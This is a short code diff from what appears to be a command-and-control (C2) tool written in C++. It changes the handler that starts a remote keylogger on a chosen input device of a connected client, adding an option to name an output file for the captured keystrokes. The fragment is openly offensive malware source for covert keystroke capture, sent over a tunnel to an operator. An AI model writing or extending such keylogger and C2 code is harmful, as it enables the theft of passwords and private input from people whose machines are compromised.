@@ -525,7 +525,6 @@ void CommandHandler::keylogger() {
                 *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Specify the target device name using -d/--dev.  You can get a list of devices using the get-dev -o <output file> command" << RESET_C2_FIFO;
                 return;
             }
-
             std::string layout = "us";
             if (arg_map_.find(KB_LAYOUT_ARG) != arg_map_.end()) {
                 layout = std::any_cast<std::string>(arg_map_[KB_LAYOUT_ARG]);
@@ -534,6 +533,15 @@ void CommandHandler::keylogger() {
             Keylogger* p_keylogger = new Keylogger();
             p_keylogger->set_dev(std::any_cast<int>(arg_map_[DEVICE_ARG]));
             p_keylogger->set_layout(layout);
+            
+            std::string out_name = "";
+            if (arg_map_.find(OUT_ARG) != arg_map_.end()) {
+                out_name = std::any_cast<std::string>(arg_map_[OUT_ARG]);
+            }
+            if (!out_name.empty()) {
+                p_keylogger->set_out(out_name);
+            }
+
             Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, p_keylogger);
             {
                 std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
